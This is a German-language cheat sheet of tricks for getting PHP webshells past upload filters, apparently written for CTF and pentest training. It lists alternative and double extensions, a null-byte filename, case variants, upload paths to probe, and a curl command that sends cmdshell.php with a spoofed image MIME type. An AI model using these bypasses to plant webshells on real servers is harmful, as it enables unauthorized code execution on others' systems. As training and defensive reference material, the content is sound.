# 🐚 PHP Webshell Upload Tricks & Bypasses

---

## Inhaltsverzeichnis
- [Einleitung](#einleitung)
- [Klassische Upload-Namen für Webshells](#klassische-upload-namen-für-webshells)
- [Tarnung als Bilddatei (Double Extensions)](#tarnung-als-bilddatei-double-extensions)
- [Groß-/Kleinschreibung (Bypass durch Case-Insensitive Filter)](#groß-kleinschreibung-bypass-durch-case-insensitive-filter)
- [Weitere gebräuchliche alternative Erweiterungen](#weitere-gebräuchliche-alternative-erweiterungen)
- [Upload-Verzeichnisse testen](#upload-verzeichnisse-testen)
- [Nützliches Tool: Content-Disposition & MIME-Typ prüfen](#nützliches-tool-content-disposition--mime-typ-prüfen)
- [Siehe auch](#siehe-auch)
- [Haftungsausschluss](#haftungsausschluss)

--- 

## Einleitung

In diesem Dokument findest du typische Dateinamen- und Erweiterungstricks, die bei **File Upload Attacks** verwendet werden, um **PHP-Webshells** trotz Dateifilter oder Upload-Validierung auf einen Webserver zu schleusen.

Solche Techniken sind besonders in **Capture The Flag (CTF)**-Challenges, **Bug Bounty**-Szenarien und **Red Team Assessments** relevant – etwa wenn Dateiuploads nur scheinbar eingeschränkt werden.

> ⚠️ Diese Datei dient ausschließlich zu **Lern- und Testzwecken** in legalen Übungsumgebungen (z. B. TryHackMe, HackTheBox).

---

## Klassische Upload-Namen für Webshells

```text
cmdshell.phtml
cmdshell.pht
cmdshell.php3
cmdshell.php4
cmdshell.php5
cmdshell.php6
cmdshell.inc
```

---

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Tarnung als Bilddatei (Double Extensions)

**Ziel:** 
Umgehen von Filtermechanismen, die .php blockieren, aber .jpg oder .png erlauben.

```text
cmdshell.php.jpg
cmdshell.php%00.jpg   # Null-Byte-Trick (nur bei älteren Servern möglich)
cmdshell.php;.jpg     # selten erlaubt, nutzt inkorrekte .htaccess oder MIME-Fehler
cmdshell.jpg.php
```

---

## Groß-/Kleinschreibung (Bypass durch Case-Insensitive Filter)

Manche Filter prüfen nur .php in Kleinbuchstaben:
```text
cmdshell.pHp
cmdshell.Php
cmdshell.PHP
```

---

## Weitere gebräuchliche alternative Erweiterungen
Diese Erweiterungen werden auf manchen falsch konfigurierten Servern ebenfalls als PHP interpretiert:

```text
.pht
.phtml
.php3
.php4
.php5
.inc
```
---

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Upload-Verzeichnisse testen
Wenn du eine Datei erfolgreich hochgeladen hast, teste verschiedene Uploadpfade:

```bash
http://[IP]/uploads/cmdshell.php
http://[IP]/admin/uploads/cmdshell.phtml
http://[IP]/images/cmdshell.php.jpg
```

---

## Nützliches Tool: Content-Disposition & MIME-Typ prüfen
Manche Filter prüfen den MIME-Typ. Tools wie Burp Suite oder curl helfen dir, die Content-Type-Header zu manipulieren:

```bash
curl -X POST -F "file=@cmdshell.php;type=image/jpeg" http://target/upload.php
```

---

**💡 Hinweis:** 
Wissen über Webshell-Uploadtricks hilft auch Defensive Security Teams, um Dateiuploads richtig abzusichern und forensisch zu analysieren.

---

## Siehe auch:

- [https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/webshells/php_web_shell_usage.md](https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/webshells/php_web_shell_usage.md)
- [https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/webshells/php_rce_cheat_sheet.md](https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/webshells/php_rce_cheat_sheet.md)
- [https://github.com/bitRaybytes/cybersecurity/blob/main/04-os-enumeration/post_exploitation_tools.md](https://github.com/bitRaybytes/cybersecurity/blob/main/04-os-enumeration/post_exploitation_tools.md)

----

## Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** August 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---